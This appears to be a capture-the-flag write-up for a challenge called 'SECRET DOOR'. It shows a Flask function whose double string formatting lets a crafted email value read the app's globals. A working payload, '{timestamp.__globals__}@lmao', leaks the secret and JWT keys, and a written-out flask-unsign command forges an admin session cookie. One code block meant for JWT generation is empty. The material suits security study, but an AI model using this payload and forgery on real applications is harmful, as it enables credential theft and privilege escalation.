# SECRET DOOR 

## Affected Function

```python
def update_email():
    if not request.is_json:
        return abort(400, 'Invalid POST format!')
    data = request.get_json()
    new_email = data.get('email', '')
    if not is_valid_email(new_email):
        return abort(401, 'Invalid Email')
    # Get old email address
    token = session.get('auth')
    decoded_token = verify_JWT(token)
    old_email = decoded_token["email"]
    # Logging Data
    time = datetime.now()
    update_date = time.strftime("%Y-%m-%d %H:%M:%S")
    log_text = f"Email updated to {new_email} at {update_date}"
    log_text = log_text.format(new_email=new_email, timestamp=timestamp, update_date=update_date)
    # Update users
    call_procedure("update_user_email", (old_email, new_email))
    # Insert Logs
    log_text = escape_html(log_text)
    call_procedure("insert_log", (new_email, log_text))
    # Log out of the page
    session['auth'] = None
    return redirect(url_for('web.logout'))
```

---

## Vulnerability

The vulnerability lies in how the `log_text` string is constructed and formatted:

1. **Initial Construction with f-string:**

   ```python
   log_text = f"Email updated to {new_email} at {update_date}"
   ```

   - Here, `new_email` is directly interpolated into `log_text` using an f-string.
   - If `new_email` contains any curly braces `{}`, they are preserved in `log_text`.

2. **Second Formatting with `.format()`:**

   ```python
   log_text = log_text.format(new_email=new_email, timestamp=timestamp, update_date=update_date)
   ```

   - The `log_text` is then passed through `.format()`, which will process any format fields `{}` present in `log_text`.
   - If `new_email` contains format fields, they will be interpreted during this formatting step.

3. **User-Controlled Input in Format String:**

   - Since `new_email` is derived from user input and can contain malicious format fields, an attacker can exploit this to access sensitive information.

---

## Exploit Details

### Crafting the Malicious Payload

- **Payload:** `{timestamp.__globals__}@lmao`

  - **Explanation:**
    - `{timestamp.__globals__}` accesses the `__globals__` attribute of the `timestamp` object.
    - This exposes the global variables in the context where `timestamp` is defined, which includes the Flask application's secret keys and configuration.

### Exploitation
**Update new email with the payload:**

   - The sensitive data is now part of `log_text`.
   - Read the Flask Secret Key and jwt key in the log with the email `{timestamp.__globals__}@lmao` 

**Generate session**
   - Generate the jwt_token with the jwt_key using jwt.io web or
   ```python
   ```
   - Then sign it with Flask secret key using flask unsign 

 ```bash
  flask-unsign --sign --cookie "{'auth': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImZsYWdAZ21haWwiLCJleHAiOjE3MjczOTUyMzYsInJvbGUiOiJhZG1pbiJ9.wi6c-xwxQHy35s9ySPU1V0o7ndIrmX6YVbj3twlCDEc'}" --secret '108df1d82a562fed8cbe4129886ef747d39a22662ec7d83c21bb8a80a935637e996fa8e2cc733734ef54e51fdcb9c950676ccd0c97b33779b6b7d838e0e3eb3250445ef05b5fcb5e86474ecb6ddd0ffbedfd2ab62a536da2da3edd378eb55040c88a3e6c95912e5e82fbee0e18f374bac9adc4efe1aec892a96d267fba1939e7fbecafaf25f0353fec89ec731a0c66286eea7ac512d13cefa8e37624741dab4c99a4c48b65fe18ad5e101b0a9e9dd811b618ee96b95913ed1468b59cd13821a17a6c3ae0ef4aeca913fcc00bfc44d732b715e93034337ce537b8afc51fbe4b58ccde1cd2537d89e86a95d36c6ef264965b46549e1081d23750e54c0aefcfd8e5'
 ```  
---

